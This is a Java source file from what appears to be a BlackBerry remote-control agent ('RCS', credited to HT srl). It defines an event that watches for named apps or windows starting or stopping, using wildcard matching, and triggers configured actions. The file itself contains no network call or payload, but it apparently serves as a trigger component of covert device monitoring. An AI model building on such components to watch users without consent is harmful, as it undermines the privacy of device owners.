//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ProcessEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.ApplicationObserver;
import blackberry.utils.Check;
import blackberry.utils.WChar;


/**
 * The Class ProcessEvent.
 */
public final class ProcessEvent extends Event implements ApplicationObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ProcessEvent", DebugLevel.INFORMATION);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    boolean processType;

    String process;

    /**
     * Instantiates a new process event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public ProcessEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_PROCESS, actionId, confParams, "ProcessEvent");
        setPeriod(NEVER);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif
        AppListener.getInstance().addApplicationObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif
        AppListener.getInstance().removeApplicationObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.ApplicationListObserver#onApplicationListChange
     * (java.util.Vector, java.util.Vector)
     */
    /*
     * public void onApplicationListChange( final Vector startedListName, final
     * Vector stoppedListName, final Vector startedListMod, final Vector
     * stoppedListMod) { //#ifdef DEBUG debug.trace("onApplicationListChange: "
     * + this); //#endif Vector startedList; Vector stoppedList; if
     * (processType) { //#ifdef DEBUG
     * debug.trace("onApplicationListChange: PROCESS (mod)"); //#endif
     * startedList = startedListMod; stoppedList = stoppedListMod; } else {
     * //#ifdef DEBUG debug.trace("onApplicationListChange: WINDOWS (name)");
     * //#endif startedList = startedListName; stoppedList = stoppedListName; }
     * if (actionOnEnter != Action.ACTION_NULL && startedList.contains(process))
     * { //#ifdef DEBUG debug.info("triggering enter: " + process); //#endif
     * trigger(actionOnEnter); } if (actionOnExit != Action.ACTION_NULL &&
     * stoppedList.contains(process)) { //#ifdef DEBUG
     * debug.info("triggering exit: " + process); //#endif
     * trigger(actionOnExit); } }
     */

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        String started, stopped;

        if (processType) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: PROCESS (mod)");
            //#endif
            started = startedMod;
            stopped = stoppedMod;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: WINDOWS (name)");
            //#endif
            started = startedName;
            stopped = stoppedName;
        }

        if (actionOnEnter != Action.ACTION_NULL && match(process, started)) {
            //#ifdef DEBUG
            debug.info("triggering enter: " + process);
            //#endif
            trigger(actionOnEnter);
        }

        if (actionOnExit != Action.ACTION_NULL && match(process, stopped)) {
            //#ifdef DEBUG
            debug.info("triggering exit: " + process);
            //#endif
            trigger(actionOnExit);
        }
    }

    public static boolean match(String wildcardProcess, String actualProcess) {
    	//#ifdef DEBUG
        debug.trace("match " + wildcardProcess + " " + actualProcess);
        //#endif
        return matchStar(wildcardProcess, actualProcess);
    }

    static boolean matchStar(String pattern, String s) {

    	if(s==null){
    		return (pattern==null);
    	}
    	
        for (;;) {

            if (pattern.length() == 0) {
                return (s.length() == 0);
            }

            if (pattern.charAt(0) == '*') {
                pattern = pattern.substring(1);
                if (pattern.length() == 0) {
                    return true;
                }

                if (pattern.charAt(0) != '?' && pattern.charAt(0) != '*') {
                    int len = s.length();
                    for (int i = 0; i < len; i++) {
                        char c = s.charAt(0);
                        s = s.substring(1);
                        String tp = pattern.substring(1);
                        if (c == pattern.charAt(0) && matchStar(tp, s)) {
                            return true;
                        }
                    }
                    return false;
                }

                for (int i = 0; i < s.length(); i++) {
                    char c = s.charAt(i);
                    s = s.substring(1);
                    if (matchStar(pattern, s)) {
                        return true;
                    }
                }
                return false;
            }

            if (s.length() == 0) {
                return false;
            }

            if (pattern.charAt(0) != '?' && pattern.charAt(0) != s.charAt(0)) {
                return false;
            }

            s = s.substring(1);
            pattern = pattern.substring(1);
        }

        //NOTREACHED 
    }

    /*
     * int match_pattern(String pattern, String s) { for(;;) { if (!*pattern)
     * return (!*s); if (*pattern == '*') { pattern++; if(!*pattern) return (1);
     * if (*pattern != '?' && *pattern != '*') { for (;*s; s++) { if (*s ==
     * *pattern && match_pattern(s + 1, pattern + 1)) return (1); } return (0);
     * } for (; *s; s++) { if (match_pattern(s,pattern)) return (1); } return
     * (0); } if (!*s) return (0); if (*pattern != '?' && *pattern != *s) return
     * (0); s++; pattern++; } //NOTREACHED }
     */
    /*
     * int match_pattern(String wildcardProcess, String actualProcess) { for
     * (;;) { if (!*pattern) return (!*s); if (*pattern == '*') { pattern++; if
     * (!*pattern) return (1); if (*pattern != '?' && *pattern != '*') { for (;
     * s; s++) { if (*s == *pattern && match_pattern(s + 1, pattern + 1)) return
     * (1); } return (0); } for (; *s; s++) { if (match_pattern(s, pattern))
     * return (1); } return (0); } if (!*s) return (0); if (*pattern != '?' &&
     * *pattern != *s) return (0); s++; pattern++; } NOTREACHED }
     */
    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {

        //#ifdef DBC
        Check.requires(confParams != null, "parse conf null");
        Check.requires(confParams.length > 12, "parse conf null");
        //#endif

        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();

            final int value = databuffer.readInt();
            processType = value == 0; // 0: process, 1: window;

            final int len = databuffer.readInt();

            //#ifdef DBC
            Check.asserts(len > 0 && len < 100, "parse wrong len: " + len);
            //#endif
            final byte[] payload = new byte[len];
            databuffer.read(payload);

            process = WChar.getString(payload, true);

            //#ifdef DBC
            Check.asserts(actionOnEnter >= Action.ACTION_NULL,
                    "negative value Enter");
            Check.asserts(actionOnExit >= Action.ACTION_NULL,
                    "negative value Exit");
            //#endif

        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG
        final StringBuffer sb = new StringBuffer();
        sb.append("enter: " + actionOnEnter);
        sb.append(" exit: " + actionOnExit);
        sb.append(" type: " + (processType ? "WIN" : "PROC"));
        sb.append(" process: " + process);
        debug.info(sb.toString());
        //#endif

        return true;
    }

}
